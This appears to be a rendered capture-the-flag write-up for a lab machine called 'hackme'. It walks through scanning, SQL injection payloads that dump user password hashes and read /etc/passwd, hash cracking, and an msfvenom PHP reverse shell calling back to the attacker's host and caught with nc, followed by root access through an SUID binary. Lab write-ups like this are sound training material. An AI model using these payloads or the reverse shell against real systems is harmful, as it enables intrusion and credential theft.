@@ -1,0 +1,191 @@
+I"w3<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/hackme<span class="nv">$ </span>hdiscovery.py <span class="nt">-t</span> 192.168.179.0/24
+192.168.179.186 is alive
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/hackme<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-p1-65535</span> 192.168.179.186 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-p1-65535</span> 192.168.179.186 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
+TCP open                     ssh[   22]         from 192.168.179.186  ttl 64 
+TCP open                    http[   80]         from 192.168.179.186  ttl 64 
+UDP open                 unknown[35405]         from 192.168.179.186  ttl 64 
+UDP open                 unknown[36824]         from 192.168.179.186  ttl 64 
+UDP open                 unknown[39810]         from 192.168.179.186  ttl 64 
+UDP open                 unknown[41259]         from 192.168.179.186  ttl 64 
+UDP open                 unknown[43890]         from 192.168.179.186  ttl 64 
+UDP open                 unknown[46917]         from 192.168.179.186  ttl 64 
+UDP open                 unknown[50643]         from 192.168.179.186  ttl 64 
+UDP open                 unknown[60466]         from 192.168.179.186  ttl 64
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/hackme<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p22</span>,80 192.168.179.186 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 6b:a8:24:d6:09:2f:c9:9a:8e:ab:bc:6e:7d:4e:b9:ad <span class="o">(</span>RSA<span class="o">)</span>
+|   256 ab:e8:4f:53:38:06:2c:6a:f3:92:e3:97:4a:0e:3e:d1 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 32:76:90:b8:7d:fc:a4:32:63:10:cd:67:61:49:d6:c4 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.34 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.34 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
+</span></code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p><img src="/assets/images/hackme/screenshot-1.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/hackme<span class="nv">$ </span>dirb http://192.168.179.186 <span class="nt">-r</span>
+...
+<span class="nt">----</span> Scanning URL: http://192.168.179.186/ <span class="nt">----</span>
++ http://192.168.179.186/index.php <span class="o">(</span>CODE:200|SIZE:100<span class="o">)</span>
++ http://192.168.179.186/server-status <span class="o">(</span>CODE:403|SIZE:303<span class="o">)</span>
+<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.186/uploads/
+</code></pre></div></div>
+
+<p><img src="/assets/images/hackme/screenshot-2.png" alt="" /></p>
+
+<p><img src="/assets/images/hackme/screenshot-3.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' or 1=1 #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/hackme/screenshot-4.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="sql-injection">SQL Injection</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' or 1=1 order by 3 #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/hackme/screenshot-5.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select 1,2,3 #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/hackme/screenshot-6.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select @@version,2,3 #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/hackme/screenshot-7.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select database(),2,3 #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/hackme/screenshot-8.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select @@datadir,2,3 #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/hackme/screenshot-9.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select user(),2,3 #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/hackme/screenshot-10.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select user,2,3 from mysql.user where file_priv='</span>Y<span class="s1">' #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/hackme/screenshot-11.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select load_file('</span>/etc/passwd<span class="s1">'),2,3 #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/hackme/screenshot-12.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select table_name,2,3 from information_schema.tables where table_schema=database() #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/hackme/screenshot-13.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select column_name,2,3 from information_schema.columns where table_schema=database() and table_name='</span><span class="nb">users</span><span class="s1">' #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/hackme/screenshot-14.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select concat_ws('</span>:<span class="s1">',user,pasword),2,3 from users #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/hackme/screenshot-15.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/hackme<span class="nv">$ </span>curl <span class="nt">-sL</span> <span class="nt">-b</span> <span class="s2">"PHPSESSID=tgq6veet5bs049gijo8pblgo3o"</span> <span class="s2">"http://192.168.179.186/welcome.php"</span> <span class="nt">--data</span> <span class="s2">"search='+and+1=2+union+select+concat_ws(':',user,pasword),2,3+from+users+#"</span> | <span class="nb">grep</span> <span class="s1">'SGD'</span> | <span class="nb">sed</span> <span class="s1">'s/&lt;td&gt;/\n/g'</span> | <span class="nb">grep</span> <span class="nt">-Pv</span> <span class="s1">'^[\d\s]'</span> | <span class="nb">sed</span> <span class="s1">'s/\(.*\)&lt;.*/\1/'</span> | <span class="nb">tee </span>creds.txt 
+user1:5d41402abc4b2a76b9719d911017c592
+user2:6269c4f71a55b24bad0f0267d9be5508
+user3:0f359740bd1cda994f8b55330c86d845
+<span class="nb">test</span>:05a671c66aefea124cc08b76ea6d30bb
+superadmin:2386acb2cf356944177746fc92523983
+test1:05a671c66aefea124cc08b76ea6d30bb
+admin:5f4dcc3b5aa765d61d8327deb882cf99
+root@kali:~/hackme<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Crack the hashes</p>
+
+<p>https://hashes.com</p>
+
+<p><img src="/assets/images/hackme/screenshot-16.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/hackme<span class="nv">$ </span><span class="k">for </span>x <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>creds.txt | <span class="nb">sed</span> <span class="s1">'$d'</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$x</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s2">":"</span> <span class="s1">'{print $1}'</span><span class="si">)</span><span class="s2">:</span><span class="si">$(</span><span class="nb">grep</span> <span class="si">$(</span><span class="nb">echo</span> <span class="nv">$x</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s2">":"</span> <span class="s1">'{print $NF}'</span><span class="si">)</span> cracked.txt<span class="si">)</span><span class="s2">"</span><span class="p">;</span> <span class="k">done
+</span>user1:5d41402abc4b2a76b9719d911017c592:hello
+user2:6269c4f71a55b24bad0f0267d9be5508:commando
+user3:0f359740bd1cda994f8b55330c86d845:p@ssw0rd
+<span class="nb">test</span>:05a671c66aefea124cc08b76ea6d30bb:testtest
+superadmin:2386acb2cf356944177746fc92523983:Uncrackable
+test1:05a671c66aefea124cc08b76ea6d30bb:testtest
+</code></pre></div></div>
+
+<p><img src="/assets/images/hackme/screenshot-17.png" alt="" /></p>
+
+<p><img src="/assets/images/hackme/screenshot-18.png" alt="" /></p>
+
+<p>we generate a php reverse shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/hackme<span class="nv">$ </span>msfvenom <span class="nt">-p</span> php/reverse_perl <span class="nv">lhost</span><span class="o">=</span>192.168.179.1 <span class="nv">lport</span><span class="o">=</span>443 <span class="nt">-o</span> z.php
+</code></pre></div></div>
+
+<p><img src="/assets/images/hackme/screenshot-19.png" alt="" /></p>
+
+<p><img src="/assets/images/hackme/screenshot-20.png" alt="" /></p>
+
+<p><img src="/assets/images/hackme/screenshot-21.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/hackme<span class="nv">$ </span>curl http://192.168.179.186/uploads/z.php
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/hackme<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.186] 55592
+script <span class="nt">-qc</span> /bin/bash /dev/null
+www-data@hackme:/var/www/html/uploads<span class="nv">$ </span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@hackme:/var/www/html<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-la</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
+...
+<span class="nt">-rwsr--r-x</span> 1 root root 8472 Mar 26  2019 /home/legacy/touchmenot
+...
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="suid-binary">SUID Binary</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@hackme:/var/www/html<span class="nv">$ </span>/home/legacy/touchmenot
+/home/legacy/touchmenot
+root@hackme:/var/www/html# <span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+root@hackme:/var/www/html# su -
+su -
+root@hackme:~# <span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@hackme:~#
+</code></pre></div></div>
+:ET
